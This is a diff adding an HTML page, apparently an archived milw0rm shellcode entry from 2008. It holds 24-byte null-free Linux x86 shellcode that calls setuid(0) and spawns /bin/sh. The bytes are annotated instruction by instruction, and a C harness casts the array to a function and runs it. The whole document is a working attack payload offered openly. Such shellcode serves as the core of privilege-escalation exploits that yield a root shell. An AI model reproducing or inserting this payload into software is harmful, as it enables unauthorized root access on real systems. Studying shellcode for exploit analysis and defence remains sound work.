@@ -1,0 +1,38 @@
+<html><head><title>linux/x86 setuid(0) & execve(/bin/sh,0,0) shellcode 24 bytes</title></head><pre>/*
+SMALLEST SETUID &amp; EXECVE GNU/LINUX x86 SHELLCODE WITHOUT NULLS THAT SPAWNS A SHELL
+
+History:
++ v1.0 (27 bytes) =&gt; http://opensec.es/2008/11/14/gnulinux-x86-setuid0-execvebinsh00-shellcode-without-null/
++ v2.0 (26 bytes) =&gt; (http://vlan7.blogspot.com/) http://packetstormsecurity.org/filedesc/smallest_setuid_execve_sc.c.html
++ v3.0 (25 bytes) =&gt; (http://opensec.es/) http://www.milw0rm.com/shellcode/7187
+
+v4.0 (24 bytes)
+################
+*/
+
+#include &lt;stdio.h&gt;
+
+const char sc[]=
+  &quot;\x6a\x17&quot; //push 17h /note this will fill the remain stack portion bytes with 0s
+  &quot;\x58&quot; //pop eax /eax = 0x00000017
+  &quot;\x99&quot; //cdq /eax&lt;0x80000000 =&gt; edx=0
+  &quot;\xcd\x80&quot; //int 80h
+  &quot;\x52&quot; //push edx (0)
+  &quot;\x68\x6e\x2f\x73\x68&quot; //push 0x68732f6e
+  &quot;\x68\x2f\x2f\x62\x69&quot; //push 0x69622f2f
+  &quot;\x8d\x42\x0b&quot; //lea eax,[edx+0bh] /LEA is FASTER than push/pop
+  &quot;\x89\xe3&quot; //mov ebx,esp
+  &quot;\xcd\x80&quot;; //int 80h
+
+void main() {
+  printf(&quot;\nSMALLEST SETUID &amp; EXECVE GNU/LINUX x86 SHELLCODE WITHOUT NULLS THAT SPAWNS A SHELL&quot;
+  &quot;\n\nCoded by vlan7&quot;
+  &quot;\n\t + http://vlan7.blogspot.com&quot;
+  &quot;\n\n[+] Date: 24/11/2008&quot;
+  &quot;\n\n[+] Thanks to: -Chema Garcia (aka sch3m4) (http://opensec.es) He has initiated the funny game :)&quot;
+  &quot;\n               -TuXeD from Wadalbertia (http://www.wadalbertia.org) for a comment on my CDQ&quot;
+  &quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;,sizeof(sc)-1);
+  (*(void (*)()) sc)();
+}
+
+// milw0rm.com [2008-11-24]</pre></html>
